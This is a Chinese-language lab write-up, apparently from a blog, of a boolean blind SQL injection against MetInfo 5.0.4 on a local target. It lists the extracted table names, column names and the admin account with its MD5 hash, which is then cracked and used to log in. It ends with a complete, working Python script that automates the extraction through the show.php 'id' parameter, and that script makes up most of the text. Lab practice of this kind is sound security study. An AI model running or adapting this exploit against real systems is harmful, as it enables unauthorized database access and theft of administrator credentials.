#  metinfo_5.0.4布尔盲注脚本实战

- 靶场用的metinfo_5.0.4

- 靶机ip：192.168.200.148

### 环境准备
- 实现该功能需要用`requests`模块、`string`模块，和注入点的url，并创建一个请求

![image-20240312121228527](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312121228527.png)

  

### 确定数据库长度

- 因为数据库的长度可能是1位也有可能是五十位，所以我们需要建立一个循环，让他测试一下到底有多少位，可以根据请求所返回的正文来判断是否正确，经过测试该页面的注入是数字型，所以无需引号闭合（该场景下，如果条件内容是正确会返回正常页面,错误则返回`404.html`。利用该情况可以实现布尔盲注）

![image-20240312123450210](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312123450210.png)

### 确定数据库名

- 经过上一步骤，已经得到该数据库名长度为七位，那么分析一下，数据库名可以由大写字母`A~Z`、小写字母`a~z`、数字`0~9`还有一些特殊符号，但是必须由字母开头。这些都是可打印字符，python中有一个`string`模块可以得到所有的可打印字符，那么只需要把这些字符跟数据库名的字符依次比较，即可得到数据库的名字，但是经过测试该页面并不能直接比较字符，所以把字符转为`ASCII`码值进行比较即可

  ![image-20240312124950144](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312124950144.png)

### 确定所有表名总长度

- 拿到数据库名后，就可以查询该数据库的所有表名一起是多长，跟查询数据库名长度一样，需要大量的尝试请求。不过这次的所有表名长度可就不止50了，设置为500，尝试一下。

![image-20240312131838354](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312131838354.png)

### 确定所有表名

- 知道了所有表名的总长度，那么只需要跟数据库名的方法一样，把注入语句更换一些便可以查询所有表的表名了

![image-20240312134416467](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312134416467.png)

- 所有表表名：

  ```
  [+] name of tables is :
  met_admin_column,met_admin_table,met_app,met_column,met_config,met_cv,met_download,met_feedback,met_flash,met_flist,met_img,met_index,met_job,met_label,met_lang,met_link,met_list,met_message,met_news,met_online,met_otherinfo,met_parameter,met_plist,met_product,met_skin_table,met_sms,met_visit_day,met_visit_detail,met_visit_summary
  
  ```

  

### 确定所有列名的长度

- 经过观察，`met_admin_table`这个表很可疑，先查询这个表中列名的长度，也是套用之前查表名长度的代码。但是经过测试，该语句不可以出现单引号，为了解决这个问题我们把表名转为十六进制的方式前面加个0x进行传递。

  ![image-20240312135539240](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312135539240.png)

### 确定所有列名

- 根据获取表名的代码套入列名的语句，即可获得列名

![image-20240312140847408](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312140847408.png)

- 所有列名

  ```
  [+] name of column is :
  id,admin_type,admin_id,admin_pass,admin_name,admin_sex,admin_tel,admin_mobile,admin_email,admin_qq,admin_msn,admin_taobao,admin_introduction,admin_login,admin_modify_ip,admin_modify_date,admin_register_date,admin_approval_date,admin_ok,admin_op,admin_issueok,admin_group,companyname,companyaddress,companyfax,usertype,checkid,companycode,companywebsite,lang,langok
  ```

  

### 获取账密长度

- 发现`admin_id`与`admin_pass`十分可疑，直接使用表名和列名查询该数据的长度，套用之前的基本格式即可

  ![image-20240312142429929](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312142429929.png)

  

### 获取账密内容

- 根据获取账密的长度，并套入获取列名的基本格式，更换查询语句即可得到管理员的账密了

![image-20240312143022404](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312143022404.png)

- 账密内容：

  ```
  [+]  admin_name_pass is :admin:e10adc3949ba59abbe56e057f20f883e
  ```

- 看到后面是密文，是32位盲猜是MD5值，直接去解码

  ![image-20240312144520646](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312144520646.png)

- 解密完直接登录后台验证，可以看到登录成功

  ![image-20240312144636863](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312144636863.png)



### 源码

```python
import requests
import string
url="http://192.168.200.148/MetInfo5.0.4/about/show.php"

req=requests.session()


# 确定数据库名的长度
for i in range(1,51):
    params={
        'lang':  "cn",
        'id' :   f"22 and length((select database()))={i}"
    }
    res=req.get(url=url,params=params)
    if "../404.html" not in res.text:
        dbname_len=i
        break
print(f"[+] The length of dbname is {i}")

# 确定数据库名
c_set=string.printable.strip()
db_name=""
for i in range(1,dbname_len+1):
   for  j in c_set :
        params={
        'lang':  "cn",
        'id':   f"22 and ascii(substr((select database()),{i},1))={ord(j)} "
        }
        res=req.get(url=url,params=params)
        if "../404.html" not in res.text:
            db_name+=j
            break
print(f"[+] name of The Database is {db_name}")


# 确定所有表名的长度
for i in range(1,501):
    params={
        'lang':  "cn",
        'id' :   f"22 and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={i}"
    }
    res=req.get(url=url,params=params)
    if "../404.html" not in res.text:
        tablename_len=i
        break
print(f"[+] The length of tables name is {i}")


# 确定所有表的表名
c_set=string.printable.strip()
table_name=""
for i in range(1,tablename_len+1):
   for  j in c_set :
        params={
        'lang':  "cn",
        'id':   f"22 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))={ord(j)} "
        }
        res=req.get(url=url,params=params)
        if "../404.html" not in res.text:
            print(f"\r[-] name of tables is :{table_name}",end="")
            table_name+=j
            break
print(f"\n\n[+] name of tables is :{table_name}")

# 确定所有表名的长度
for i in range(1,501):
    params={
        'lang':  "cn",
        'id' :   f"22 and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65))={i}"
    }
    res=req.get(url=url,params=params)
    if "../404.html" not in res.text:
        columnname_len=i
        break
print(f"[+] The length of columns name is {i}")


# 确定所有表的表名
c_set=string.printable.strip()
column_name=""
for i in range(1,columnname_len+1):
   for  j in c_set :
        params={
        'lang':  "cn",
        'id':   f"22 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65),{i},1))={ord(j)} "
        }
        res=req.get(url=url,params=params)
        if "../404.html" not in res.text:
            print(f"\r[-] name of columns is :{column_name}",end="")
            column_name+=j
            break
print(f"\n\n[+] name of column is :{column_name}")

# 查询账密
for i in range(1,501):
    params={
        'lang':  "cn",
        'id' :   f"22 and length((select concat(admin_id,0x3a,admin_pass) from met_admin_table))={i}"
    }
    res=req.get(url=url,params=params)
    if "../404.html" not in res.text:
        admin_len=i
        break
print(f"[+] The length of admin is {i}")


# 确定账密
c_set=string.printable.strip()
admin_name_pass=""
for i in range(1,admin_len+1):
   for  j in c_set :
        params={
        'lang':  "cn",
        'id':   f"22 and ascii(substr((select concat(admin_id,0x3a,admin_pass) from met_admin_table),{i},1))={ord(j)} "
        }
        res=req.get(url=url,params=params)
        if "../404.html" not in res.text:
            print(f"\r[-]  admin_name_pass is :{admin_name_pass}",end="")
            admin_name_pass+=j
            break
print(f"\n\n[+]  admin_name_pass is :{admin_name_pass}")


```

